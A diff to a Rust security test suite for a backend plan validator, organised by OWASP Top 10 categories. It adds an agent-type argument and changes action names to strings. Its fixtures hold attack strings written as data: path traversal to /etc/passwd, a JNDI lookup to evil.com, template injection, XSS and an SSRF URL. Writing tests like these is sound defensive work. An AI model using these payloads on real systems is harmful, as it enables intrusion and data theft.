@@ -5,6 +5,7 @@ use scribe_backend::{
             types::*,
         },
         EcsEntityManager,
+        agentic::unified_tool_registry::AgentType,
     },
     test_helpers::{spawn_app, TestDataGuard, db::create_test_user},
     PgPool,
@@ -104,7 +105,7 @@ async fn test_a01_broken_access_control_cross_user_entity_access() {
         actions: vec![
             PlannedAction {
                 id: "malicious_step".to_string(),
-                name: ActionName::MoveEntity,
+                name: "move_entity".to_string(),
                 parameters: serde_json::json!({
                     "entity_to_move": user2_character.to_string(),
                     "new_parent": user2_location.to_string(),
@@ -129,7 +130,7 @@ async fn test_a01_broken_access_control_cross_user_entity_access() {
         },
     };
     
-    let result = validator.validate_plan(&malicious_plan, user1_id).await.unwrap();
+    let result = validator.validate_plan(&malicious_plan, user1_id, AgentType::Tactical).await.unwrap();
     
     match result {
         PlanValidationResult::Valid(_) => {
@@ -184,7 +185,7 @@ async fn test_a01_broken_access_control_permission_boundaries() {
         actions: vec![
             PlannedAction {
                 id: "step1".to_string(),
-                name: ActionName::UpdateEntity,
+                name: "update_entity".to_string(),
                 parameters: serde_json::json!({
                     "entity_id": admin_entity.to_string(),
                     "component_operations": [{
@@ -213,7 +214,7 @@ async fn test_a01_broken_access_control_permission_boundaries() {
         },
     };
     
-    let result = validator.validate_plan(&plan, user_id).await.unwrap();
+    let result = validator.validate_plan(&plan, user_id, AgentType::Tactical).await.unwrap();
     
     match result {
         PlanValidationResult::Valid(_) => {
@@ -256,7 +257,7 @@ async fn test_a03_injection_sql_injection_in_entity_names() {
             actions: vec![
                 PlannedAction {
                     id: "injection_test".to_string(),
-                    name: ActionName::FindEntity,
+                    name: "find_entity".to_string(),
                     parameters: serde_json::json!({
                         "criteria": {
                             "type": "ByName",
@@ -284,7 +285,7 @@ async fn test_a03_injection_sql_injection_in_entity_names() {
         };
         
         // Should not panic or allow injection
-        let result = validator.validate_plan(&plan, user_id).await;
+        let result = validator.validate_plan(&plan, user_id, AgentType::Tactical).await;
         assert!(result.is_ok(), "Validator should handle injection attempts safely");
     }
 }
@@ -307,7 +308,7 @@ async fn test_a03_injection_json_injection_in_parameters() {
         actions: vec![
             PlannedAction {
                 id: "json_injection".to_string(),
-                name: ActionName::CreateEntity,
+                name: "create_entity".to_string(),
                 parameters: serde_json::json!({
                     "entity_name": "Test",
                     "archetype_signature": "Name",
@@ -327,7 +328,7 @@ async fn test_a03_injection_json_injection_in_parameters() {
         },
     };
     
-    let result = validator.validate_plan(&plan, user_id).await;
+    let result = validator.validate_plan(&plan, user_id, AgentType::Tactical).await;
     assert!(result.is_ok(), "Should handle malformed JSON gracefully");
 }
 
@@ -349,7 +350,7 @@ async fn test_a04_insecure_design_plan_complexity_limits() {
     for i in 0..1000 {
         actions.push(PlannedAction {
             id: format!("step{}", i),
-            name: ActionName::FindEntity,
+            name: "find_entity".to_string(),
             parameters: serde_json::json!({"criteria": {"type": "ByName", "name": "Test"}}),
             preconditions: Preconditions::default(),
             effects: Effects::default(),
@@ -369,7 +370,7 @@ async fn test_a04_insecure_design_plan_complexity_limits() {
     
     // Should handle large plans without crashing
     let start = std::time::Instant::now();
-    let result = validator.validate_plan(&complex_plan, user_id).await;
+    let result = validator.validate_plan(&complex_plan, user_id, AgentType::Tactical).await;
     let duration = start.elapsed();
     
     assert!(result.is_ok());
@@ -396,7 +397,7 @@ async fn test_a05_security_misconfiguration_error_information_leakage() {
         actions: vec![
             PlannedAction {
                 id: "step1".to_string(),
-                name: ActionName::GetEntityDetails,
+                name: "get_entity_details".to_string(),
                 parameters: serde_json::json!({
                     "entity_id": secret_id.to_string(),
                 }),
@@ -420,7 +421,7 @@ async fn test_a05_security_misconfiguration_error_information_leakage() {
         },
     };
     
-    let result = validator.validate_plan(&plan, user_id).await.unwrap();
+    let result = validator.validate_plan(&plan, user_id, AgentType::Tactical).await.unwrap();
     
     match result {
         PlanValidationResult::Invalid(invalid) => {
@@ -453,7 +454,7 @@ async fn test_a07_authentication_failures_user_context_validation() {
         actions: vec![
             PlannedAction {
                 id: "step1".to_string(),
-                name: ActionName::CreateEntity,
+                name: "create_entity".to_string(),
                 parameters: serde_json::json!({
                     "entity_name": "Test",
                     "archetype_signature": "Name",
@@ -472,7 +473,7 @@ async fn test_a07_authentication_failures_user_context_validation() {
     };
     
     // Should handle invalid user gracefully
-    let result = validator.validate_plan(&plan, invalid_user_id).await;
+    let result = validator.validate_plan(&plan, invalid_user_id, AgentType::Tactical).await;
     assert!(result.is_ok()); // Won't find any entities for nil user
 }
 
@@ -510,7 +511,7 @@ async fn test_a08_data_integrity_plan_validation_consistency() {
         actions: vec![
             PlannedAction {
                 id: "step1".to_string(),
-                name: ActionName::AddItemToInventory,
+                name: "add_item_to_inventory".to_string(),
                 parameters: serde_json::json!({
                     "owner_entity_id": entity_id.to_string(),
                     "item_entity_id": Uuid::new_v4().to_string(),
@@ -534,7 +535,7 @@ async fn test_a08_data_integrity_plan_validation_consistency() {
         },
     };
     
-    let result = validator.validate_plan(&plan, user_id).await.unwrap();
+    let result = validator.validate_plan(&plan, user_id, AgentType::Tactical).await.unwrap();
     
     match result {
         PlanValidationResult::Invalid(invalid) => {
@@ -566,7 +567,7 @@ async fn test_a09_logging_plan_validation_audit_trail() {
         actions: vec![
             PlannedAction {
                 id: "suspicious".to_string(),
-                name: ActionName::UpdateEntity,
+                name: "update_entity".to_string(),
                 parameters: serde_json::json!({
                     "entity_id": Uuid::new_v4().to_string(),
                     "component_operations": [{
@@ -587,7 +588,7 @@ async fn test_a09_logging_plan_validation_audit_trail() {
     };
     
     // Validation should complete (even if plan is invalid)
-    let result = validator.validate_plan(&suspicious_plan, user_id).await;
+    let result = validator.validate_plan(&suspicious_plan, user_id, AgentType::Tactical).await;
     assert!(result.is_ok());
     
     // In production, we would verify audit logs contain:
@@ -617,7 +618,7 @@ async fn test_a10_ssrf_external_reference_prevention() {
         actions: vec![
             PlannedAction {
                 id: "ssrf_test".to_string(),
-                name: ActionName::CreateEntity,
+                name: "create_entity".to_string(),
                 parameters: serde_json::json!({
                     "entity_name": "http://evil.com/steal-data",
                     "archetype_signature": "Name",
@@ -638,7 +639,7 @@ async fn test_a10_ssrf_external_reference_prevention() {
     };
     
     // Should validate without making external requests
-    let result = validator.validate_plan(&ssrf_plan, user_id).await;
+    let result = validator.validate_plan(&ssrf_plan, user_id, AgentType::Tactical).await;
     assert!(result.is_ok(), "Should handle SSRF attempts safely");
     
     // The validator itself doesn't make external requests,
@@ -663,7 +664,7 @@ async fn test_comprehensive_security_malicious_plan_patterns() {
         actions: vec![
             PlannedAction {
                 id: "../../../etc/passwd".to_string(),
-                name: ActionName::CreateEntity,
+                name: "create_entity".to_string(),
                 parameters: serde_json::json!({
                     "entity_name": "{{7*7}}${jndi:ldap://evil.com/a}",
                     "archetype_signature": "Name|<img src=x onerror=alert(1)>",
@@ -698,7 +699,7 @@ async fn test_comprehensive_security_malicious_plan_patterns() {
     };
     
     // Should handle all attack vectors gracefully
-    let result = validator.validate_plan(&malicious_plan, user_id).await;
+    let result = validator.validate_plan(&malicious_plan, user_id, AgentType::Tactical).await;
     
     match result {
         Ok(_) => {
